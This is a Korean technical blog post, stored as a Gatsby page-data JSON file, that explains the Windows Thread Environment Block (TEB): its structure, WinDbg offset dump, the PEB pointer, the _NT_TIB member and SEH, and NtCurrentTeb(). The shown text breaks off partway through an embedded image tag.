{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/window_4_theori/",
    "result": {"data":{"cur":{"id":"221bd0db-e02b-58bb-9a44-6e40646b30e7","html":"<h1 id=\"teb-thread-environment-block\" style=\"position:relative;\"><a href=\"#teb-thread-environment-block\" aria-label=\"teb thread environment block permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TEB (Thread Environment Block)</h1>\n<ul>\n<li>프로세스에서 실행되는 스레드에 대한 정보를 담고 있는 구조체</li>\n<li>스레드별로 TEB 구조체가 하나씩 할당된다.</li>\n<li>OS 종류별로 해당 모양이 조금씩 달라진다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_TEB</span> <span class=\"token punctuation\">{</span>\n  PVOID Reserved1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PPEB  ProcessEnvironmentBlock<span class=\"token punctuation\">;</span>\n  PVOID Reserved2<span class=\"token punctuation\">[</span><span class=\"token number\">399</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  BYTE  Reserved3<span class=\"token punctuation\">[</span><span class=\"token number\">1952</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PVOID TlsSlots<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  BYTE  Reserved4<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PVOID Reserved5<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PVOID ReservedForOle<span class=\"token punctuation\">;</span>\n  PVOID Reserved6<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PVOID TlsExpansionSlots<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> TEB<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PTEB<span class=\"token punctuation\">;</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token number\">0</span><span class=\"token operator\">:</span><span class=\"token number\">001</span><span class=\"token operator\">></span> dt _TEB\nntdll<span class=\"token operator\">!</span>_TEB\n   <span class=\"token operator\">+</span><span class=\"token number\">0x000</span> NtTib            <span class=\"token operator\">:</span> _NT_TIB\n   <span class=\"token operator\">+</span><span class=\"token number\">0x01c</span> EnvironmentPointer <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x020</span> ClientId         <span class=\"token operator\">:</span> _CLIENT_ID\n   <span class=\"token operator\">+</span><span class=\"token number\">0x028</span> ActiveRpcHandle  <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x02c</span> ThreadLocalStoragePointer <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x030</span> ProcessEnvironmentBlock <span class=\"token operator\">:</span> Ptr32 _PEB\n   <span class=\"token operator\">+</span><span class=\"token number\">0x034</span> LastErrorValue   <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x038</span> CountOfOwnedCriticalSections <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x03c</span> CsrClientThread  <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x040</span> Win32ThreadInfo  <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x044</span> User32Reserved   <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0ac</span> UserReserved     <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0c0</span> WOW32Reserved    <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0c4</span> CurrentLocale    <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0c8</span> FpSoftwareStatusRegister <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0cc</span> ReservedForDebuggerInstrumentation <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x10c</span> SystemReserved1  <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x174</span> PlaceholderCompatibilityMode <span class=\"token operator\">:</span> Char\n   <span class=\"token operator\">+</span><span class=\"token number\">0x175</span> PlaceholderHydrationAlwaysExplicit <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x176</span> PlaceholderReserved <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> Char\n   <span class=\"token operator\">+</span><span class=\"token number\">0x180</span> ProxiedProcessId <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x184</span> _ActivationStack <span class=\"token operator\">:</span> _ACTIVATION_CONTEXT_STACK\n   <span class=\"token operator\">+</span><span class=\"token number\">0x19c</span> WorkingOnBehalfTicket <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x1a4</span> ExceptionCode    <span class=\"token operator\">:</span> Int4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x1a8</span> ActivationContextStackPointer <span class=\"token operator\">:</span> Ptr32 _ACTIVATION_CONTEXT_STACK\n   <span class=\"token operator\">+</span><span class=\"token number\">0x1ac</span> InstrumentationCallbackSp <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x1b0</span> InstrumentationCallbackPreviousPc <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x1b4</span> InstrumentationCallbackPreviousSp <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x1b8</span> InstrumentationCallbackDisabled <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x1b9</span> SpareBytes       <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x1d0</span> TxFsContext      <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x1d4</span> GdiTebBatch      <span class=\"token operator\">:</span> _GDI_TEB_BATCH\n   <span class=\"token operator\">+</span><span class=\"token number\">0x6b4</span> RealClientId     <span class=\"token operator\">:</span> _CLIENT_ID\n   <span class=\"token operator\">+</span><span class=\"token number\">0x6bc</span> GdiCachedProcessHandle <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x6c0</span> GdiClientPID     <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x6c4</span> GdiClientTID     <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x6c8</span> GdiThreadLocalInfo <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x6cc</span> Win32ClientInfo  <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">62</span><span class=\"token punctuation\">]</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x7c4</span> glDispatchTable  <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">233</span><span class=\"token punctuation\">]</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xb68</span> glReserved1      <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">29</span><span class=\"token punctuation\">]</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xbdc</span> glReserved2      <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xbe0</span> glSectionInfo    <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xbe4</span> glSection        <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xbe8</span> glTable          <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xbec</span> glCurrentRC      <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xbf0</span> glContext        <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xbf4</span> LastStatusValue  <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xbf8</span> StaticUnicodeString <span class=\"token operator\">:</span> _UNICODE_STRING\n   <span class=\"token operator\">+</span><span class=\"token number\">0xc00</span> StaticUnicodeBuffer <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">261</span><span class=\"token punctuation\">]</span> Wchar\n   <span class=\"token operator\">+</span><span class=\"token number\">0xe0c</span> DeallocationStack <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xe10</span> TlsSlots         <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf10</span> TlsLinks         <span class=\"token operator\">:</span> _LIST_ENTRY\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf18</span> Vdm              <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf1c</span> ReservedForNtRpc <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf20</span> DbgSsReserved    <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf28</span> HardErrorMode    <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf2c</span> Instrumentation  <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf50</span> ActivityId       <span class=\"token operator\">:</span> _GUID\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf60</span> SubProcessTag    <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf64</span> PerflibData      <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf68</span> EtwTraceData     <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf6c</span> WinSockData      <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf70</span> GdiBatchCount    <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf74</span> CurrentIdealProcessor <span class=\"token operator\">:</span> _PROCESSOR_NUMBER\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf74</span> IdealProcessorValue <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf74</span> ReservedPad0     <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf75</span> ReservedPad1     <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf76</span> ReservedPad2     <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf77</span> IdealProcessor   <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf78</span> GuaranteedStackBytes <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf7c</span> ReservedForPerf  <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf80</span> ReservedForOle   <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf84</span> WaitingOnLoaderLock <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf88</span> SavedPriorityState <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf8c</span> ReservedForCodeCoverage <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf90</span> ThreadPoolData   <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf94</span> TlsExpansionSlots <span class=\"token operator\">:</span> Ptr32 Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf98</span> MuiGeneration    <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xf9c</span> IsImpersonating  <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfa0</span> NlsCache         <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfa4</span> pShimData        <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfa8</span> HeapData         <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfac</span> CurrentTransactionHandle <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfb0</span> ActiveFrame      <span class=\"token operator\">:</span> Ptr32 _TEB_ACTIVE_FRAME\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfb4</span> FlsData          <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfb8</span> PreferredLanguages <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfbc</span> UserPrefLanguages <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfc0</span> MergedPrefLanguages <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfc4</span> MuiImpersonation <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfc8</span> CrossTebFlags    <span class=\"token operator\">:</span> Uint2B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfc8</span> SpareCrossTebBits <span class=\"token operator\">:</span> Pos <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span> Bits\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> SameTebFlags     <span class=\"token operator\">:</span> Uint2B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> SafeThunkCall    <span class=\"token operator\">:</span> Pos <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> InDebugPrint     <span class=\"token operator\">:</span> Pos <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> HasFiberData     <span class=\"token operator\">:</span> Pos <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> SkipThreadAttach <span class=\"token operator\">:</span> Pos <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> WerInShipAssertCode <span class=\"token operator\">:</span> Pos <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> RanProcessInit   <span class=\"token operator\">:</span> Pos <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> ClonedThread     <span class=\"token operator\">:</span> Pos <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> SuppressDebugMsg <span class=\"token operator\">:</span> Pos <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> DisableUserStackWalk <span class=\"token operator\">:</span> Pos <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> RtlExceptionAttached <span class=\"token operator\">:</span> Pos <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> InitialThread    <span class=\"token operator\">:</span> Pos <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> SessionAware     <span class=\"token operator\">:</span> Pos <span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> LoadOwner        <span class=\"token operator\">:</span> Pos <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> LoaderWorker     <span class=\"token operator\">:</span> Pos <span class=\"token number\">13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> SkipLoaderInit   <span class=\"token operator\">:</span> Pos <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfca</span> SpareSameTebBits <span class=\"token operator\">:</span> Pos <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfcc</span> TxnScopeEnterCallback <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfd0</span> TxnScopeExitCallback <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfd4</span> TxnScopeContext  <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfd8</span> LockCount        <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfdc</span> WowTebOffset     <span class=\"token operator\">:</span> Int4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfe0</span> ResourceRetValue <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfe4</span> ReservedForWdf   <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0xfe8</span> ReservedForCrt   <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0xff0</span> EffectiveContainerId <span class=\"token operator\">:</span> _GUID</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token number\">0</span><span class=\"token operator\">:</span><span class=\"token number\">001</span><span class=\"token operator\">></span> dt _TEB\nntdll<span class=\"token operator\">!</span>_TEB\n   <span class=\"token operator\">+</span><span class=\"token number\">0x000</span> NtTib            <span class=\"token operator\">:</span> _NT_TIB\n   <span class=\"token operator\">+</span><span class=\"token number\">0x01c</span> EnvironmentPointer <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x020</span> ClientId         <span class=\"token operator\">:</span> _CLIENT_ID\n   <span class=\"token operator\">+</span><span class=\"token number\">0x028</span> ActiveRpcHandle  <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x02c</span> ThreadLocalStoragePointer <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x030</span> ProcessEnvironmentBlock <span class=\"token operator\">:</span> Ptr32 _PEB\n\t <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></code></pre></div>\n<h3 id=\"processenvironmentblock-member\" style=\"position:relative;\"><a href=\"#processenvironmentblock-member\" aria-label=\"processenvironmentblock member permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ProcessEnvironmentBlock member</h3>\n<ul>\n<li>0x30 offset 에 위치한 ProcessEnvironmentBlock member</li>\n<li>PEB(Process Environment Block) 구조체의 포인터이다.</li>\n<li>PEB는 프로세스 별로 하나만 생성된다.</li>\n</ul>\n<h3 id=\"nttib-member\" style=\"position:relative;\"><a href=\"#nttib-member\" aria-label=\"nttib member permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>NtTib member</h3>\n<ul>\n<li>TEB 구조체의 첫 번째 멤버는 <code class=\"language-text\">_NT_TIB</code> 구조체이다.</li>\n<li>_NT_TIB (_NT_Thread information Block)</li>\n<li>현재 실행 중인 스레드에 대한 정보를 저장하고 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_NT_TIB</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_EXCEPTION_REGISTRATION_RECORD</span> <span class=\"token operator\">*</span>ExceptionList<span class=\"token punctuation\">;</span>\n    PVOID StackBase<span class=\"token punctuation\">;</span>\n    PVOID StackLimit<span class=\"token punctuation\">;</span>\n    PVOID SubSystemTib<span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\"><span class=\"token function\">defined</span><span class=\"token punctuation\">(</span>_MSC_EXTENSIONS<span class=\"token punctuation\">)</span></span></span>\n    <span class=\"token keyword\">union</span> <span class=\"token punctuation\">{</span>\n        PVOID FiberData<span class=\"token punctuation\">;</span>\n        DWORD Version<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">else</span></span>\n    PVOID FiberData<span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span>\n    PVOID ArbitraryUserPointer<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_NT_TIB</span> <span class=\"token operator\">*</span>Self<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> NT_TIB<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typedef</span> NT_TIB <span class=\"token operator\">*</span>PNT_TIB<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>ExceptionList member는 _EXCEPTION_REGISTRATION_RECORD 구조체 연결 리스트를 가리키고 있다. 이것은 SEH(Structured Exception Handler) 라고 하는 Window OS의 예외 처리 메커니즘에 사용된다.</li>\n<li>Self 멤버는 _NT_TIB 구조체의 셀프 포인터이며 곧 TEB 구조체 포인터이기도 한다. (TEB 구조체 첫 번째 멤버가 _NT_TIB 구조체이기 때문이다.)</li>\n</ul>\n<h2 id=\"유저-모드-teb-접근-방법\" style=\"position:relative;\"><a href=\"#%EC%9C%A0%EC%A0%80-%EB%AA%A8%EB%93%9C-teb-%EC%A0%91%EA%B7%BC-%EB%B0%A9%EB%B2%95\" aria-label=\"유저 모드 teb 접근 방법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>유저 모드 TEB 접근 방법</h2>\n<h3 id=\"ntdllntcurrentteb\" style=\"position:relative;\"><a href=\"#ntdllntcurrentteb\" aria-label=\"ntdllntcurrentteb permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ntdll.NtCurrentTeb()</h3>\n<ul>\n<li>Ntdll.NtCurrentTeb() API는 현재 스레드의 TEB 구조체 주소를 리턴하는 함수이다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.555555555555554%; position: relative; bottom: 0; left: 0; background-image: 